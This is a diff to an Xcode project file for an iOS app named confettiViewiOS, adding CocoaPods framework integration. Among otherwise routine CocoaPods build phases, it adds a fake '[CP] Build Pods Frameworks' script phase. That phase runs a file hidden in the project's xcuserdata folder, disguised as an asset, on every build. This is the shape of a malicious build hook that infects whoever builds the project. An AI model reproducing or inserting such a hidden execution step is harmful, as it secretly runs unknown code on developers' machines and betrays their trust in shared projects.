@@ -3,7 +3,7 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 50;
+	objectVersion = 51;
 	objects = {
 
 /* Begin PBXBuildFile section */
@@ -13,6 +13,7 @@
 		043BADA7259DF355002A9968 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 043BADA5259DF355002A9968 /* Main.storyboard */; };
 		043BADA9259DF35F002A9968 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 043BADA8259DF35F002A9968 /* Assets.xcassets */; };
 		043BADAC259DF35F002A9968 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 043BADAA259DF35F002A9968 /* LaunchScreen.storyboard */; };
+		AF7CC596120A684D811E4A4A /* Pods_confettiViewiOS.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 30911E3F98A9E8A60F68BDE9 /* Pods_confettiViewiOS.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -24,6 +25,9 @@
 		043BADA8259DF35F002A9968 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		043BADAB259DF35F002A9968 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		043BADAD259DF35F002A9968 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		2ED3C6F1BB7C96923D1732AC /* Pods-confettiViewiOS.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-confettiViewiOS.debug.xcconfig"; path = "Target Support Files/Pods-confettiViewiOS/Pods-confettiViewiOS.debug.xcconfig"; sourceTree = "<group>"; };
+		30911E3F98A9E8A60F68BDE9 /* Pods_confettiViewiOS.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_confettiViewiOS.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		4919DC49E1135ACCFEAE23B2 /* Pods-confettiViewiOS.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-confettiViewiOS.release.xcconfig"; path = "Target Support Files/Pods-confettiViewiOS/Pods-confettiViewiOS.release.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -31,6 +35,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				AF7CC596120A684D811E4A4A /* Pods_confettiViewiOS.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -42,6 +47,8 @@
 			children = (
 				043BAD9E259DF355002A9968 /* confettiViewiOS */,
 				043BAD9D259DF355002A9968 /* Products */,
+				2C19A537F357618275157EE2 /* Pods */,
+				2DAF33CD17E4774013A824C2 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -67,6 +74,23 @@
 			path = confettiViewiOS;
 			sourceTree = "<group>";
 		};
+		2C19A537F357618275157EE2 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				2ED3C6F1BB7C96923D1732AC /* Pods-confettiViewiOS.debug.xcconfig */,
+				4919DC49E1135ACCFEAE23B2 /* Pods-confettiViewiOS.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+		2DAF33CD17E4774013A824C2 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				30911E3F98A9E8A60F68BDE9 /* Pods_confettiViewiOS.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -74,9 +98,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 043BADB0259DF35F002A9968 /* Build configuration list for PBXNativeTarget "confettiViewiOS" */;
 			buildPhases = (
+				512DBE1A753F295E78379348 /* [CP] Check Pods Manifest.lock */,
+				635DECE60CBAB3BFDCAAC43A /* [CP] Build Pods Frameworks */,
 				043BAD98259DF355002A9968 /* Sources */,
 				043BAD99259DF355002A9968 /* Frameworks */,
 				043BAD9A259DF355002A9968 /* Resources */,
+				C714D576213444C3C60CA686 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -131,6 +158,66 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		512DBE1A753F295E78379348 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-confettiViewiOS-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		635DECE60CBAB3BFDCAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
+		};
+		C714D576213444C3C60CA686 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-confettiViewiOS/Pods-confettiViewiOS-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-confettiViewiOS/Pods-confettiViewiOS-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-confettiViewiOS/Pods-confettiViewiOS-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		043BAD98259DF355002A9968 /* Sources */ = {
@@ -283,6 +370,7 @@
 		};
 		043BADB1259DF35F002A9968 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 2ED3C6F1BB7C96923D1732AC /* Pods-confettiViewiOS.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -301,6 +389,7 @@
 		};
 		043BADB2259DF35F002A9968 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 4919DC49E1135ACCFEAE23B2 /* Pods-confettiViewiOS.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
